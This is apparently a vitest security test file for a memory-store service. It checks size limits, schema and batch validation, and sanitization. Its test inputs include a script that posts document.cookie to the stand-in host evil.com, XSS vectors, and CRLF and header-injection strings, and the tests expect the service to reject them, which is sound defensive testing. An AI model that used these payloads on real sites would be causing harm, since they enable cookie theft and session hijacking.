import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { MemoryStoreService } from '../../src/services/memory-store-service.js';
import { DatabaseManager } from '../../src/db/database-manager.js';

describe('Security Tests - Payload Validation', () => {
  let memoryStore: MemoryStoreService;
  let dbManager: DatabaseManager;
  let testUserId: string;

  beforeEach(async () => {
    dbManager = new DatabaseManager();
    await dbManager.initialize();
    memoryStore = new MemoryStoreService(dbManager);
    testUserId = 'test-user-id';
  });

  afterEach(async () => {
    await dbManager.cleanup();
  });

  describe('Payload Size Limits', () => {
    it('should reject oversized payloads', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Create a very large payload (>10MB)
      const largeContent = 'A'.repeat(11 * 1024 * 1024); // 11MB

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: largeContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('payload too large');
    });

    it('should accept payloads within size limits', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Create a reasonably sized payload (<5MB)
      const normalContent = 'A'.repeat(1024 * 1024); // 1MB

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: normalContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(true);
    });

    it('should have different size limits for different content types', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Test entity size limit
      const entityContent = 'x'.repeat(5 * 1024 * 1024); // 5MB
      const entityResult = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: entityContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      // Test observation size limit (should be smaller)
      const observationContent = 'x'.repeat(2 * 1024 * 1024); // 2MB
      const observationResult = await memoryStore.store(
        {
          kind: 'observation' as const,
          content: observationContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      // Both should succeed as they're within their respective limits
      expect(entityResult.success).toBe(true);
      expect(observationResult.success).toBe(true);
    });
  });

  describe('Content Validation and Sanitization', () => {
    it('should reject malicious script content', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const maliciousContent = `
        <script>
          // Malicious JavaScript
          fetch('https://evil.com/steal-data', {
            method: 'POST',
            body: document.cookie
          });
        </script>
      `;

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: maliciousContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('malicious content detected');
    });

    it('should sanitize HTML content', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const htmlContent = `
        <div>
          <p>Valid content</p>
          <img src="x" onerror="alert('XSS')">
          <script>alert('XSS');</script>
          <a href="javascript:alert('XSS')">Click me</a>
        </div>
      `;

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: htmlContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      if (result.success) {
        // If accepted, should be sanitized
        expect(result.storedContent).not.toContain('<script>');
        expect(result.storedContent).not.toContain('onerror');
        expect(result.storedContent).not.toContain('javascript:');
      } else {
        // Should be rejected
        expect(result.error).toContain('malicious content');
      }
    });

    it('should validate JSON structure in structured data', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const validStructuredData = {
        name: 'Test Entity',
        properties: {
          value: 123,
          active: true,
          tags: ['tag1', 'tag2'],
        },
      };

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          data: validStructuredData,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(true);

      // Test with circular reference (should be rejected)
      const circularData: any = { name: 'Circular' };
      circularData.self = circularData;

      const circularResult = await memoryStore.store(
        {
          kind: 'entity' as const,
          data: circularData,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(circularResult.success).toBe(false);
      expect(circularResult.error).toContain('circular reference');
    });
  });

  describe('Schema Validation', () => {
    it('should validate required fields in knowledge items', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Test missing required kind field
      const invalidItem = {
        content: 'Test content',
        // Missing kind field
        scope: { tenant: 'test-tenant', org: 'test-org' },
      };

      const result = await memoryStore.store(invalidItem, userContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('required field missing');
    });

    it('should validate enum values for kind field', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const invalidKind = {
        kind: 'invalid-kind' as any,
        content: 'Test content',
        scope: { tenant: 'test-tenant', org: 'test-org' },
      };

      const result = await memoryStore.store(invalidKind, userContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('invalid kind value');
    });

    it('should validate UUID formats for identifiers', async () => {
      const userContext = {
        userId: 'invalid-uuid-format',
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: 'Test content',
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('invalid UUID format');
    });

    it('should validate scope object structure', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Test invalid scope structure
      const invalidScope = {
        kind: 'entity' as const,
        content: 'Test content',
        scope: {
          tenant: 'test-tenant',
          // Missing required org field
        },
      };

      const result = await memoryStore.store(invalidScope, userContext);

      expect(result.success).toBe(false);
      expect(result.error).toContain('invalid scope structure');
    });
  });

  describe('Input Encoding Validation', () => {
    it('should handle Unicode content safely', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const unicodeContent = `
        Valid Unicode: 🧠 Cortex Memory
        Special chars: áéíóú ñ
        Emojis: 🚀 🛡️ 🔐
        Zero-width characters: ​
      `;

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: unicodeContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(true);
    });

    it('should reject control characters and dangerous encodings', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const dangerousContent = `
        Control characters: \x00\x01\x02
        Null bytes: \0
        Backdoor: \r\nSet-Cookie: admin=true
      `;

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: dangerousContent,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('invalid characters');
    });

    it('should prevent header injection through content', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const headerInjection = `
        Content-Type: application/json
        X-Forwarded-For: 127.0.0.1
        Authorization: Bearer fake-token

        Malicious content
      `;

      const result = await memoryStore.store(
        {
          kind: 'entity' as const,
          content: headerInjection,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('header injection');
    });
  });

  describe('Batch Operation Validation', () => {
    it('should validate batch size limits', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Create oversized batch (>100 items)
      const oversizedBatch = [];
      for (let i = 0; i < 150; i++) {
        oversizedBatch.push({
          kind: 'entity' as const,
          content: `Batch item ${i}`,
          scope: { tenant: 'test-tenant', org: 'test-org' },
        });
      }

      const result = await memoryStore.store(
        {
          items: oversizedBatch,
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('batch size exceeded');
    });

    it('should validate total batch payload size', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      // Create batch with large total size (>50MB)
      const largeBatch = [];
      for (let i = 0; i < 10; i++) {
        largeBatch.push({
          kind: 'entity' as const,
          content: 'x'.repeat(6 * 1024 * 1024), // 6MB each
          scope: { tenant: 'test-tenant', org: 'test-org' },
        });
      }

      const result = await memoryStore.store(
        {
          items: largeBatch,
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('batch payload too large');
    });

    it('should validate individual items in batch', async () => {
      const userContext = {
        userId: testUserId,
        tenant: 'test-tenant',
        org: 'test-org',
      };

      const mixedBatch = [
        {
          kind: 'entity' as const,
          content: 'Valid item',
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        {
          kind: 'invalid-kind' as any,
          content: 'Invalid item',
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
        {
          kind: 'entity' as const,
          content: 'Another valid item',
          scope: { tenant: 'test-tenant', org: 'test-org' },
        },
      ];

      const result = await memoryStore.store(
        {
          items: mixedBatch,
        },
        userContext
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('invalid item in batch');
      expect(result.failedItemIndex).toBe(1);
    });
  });
});
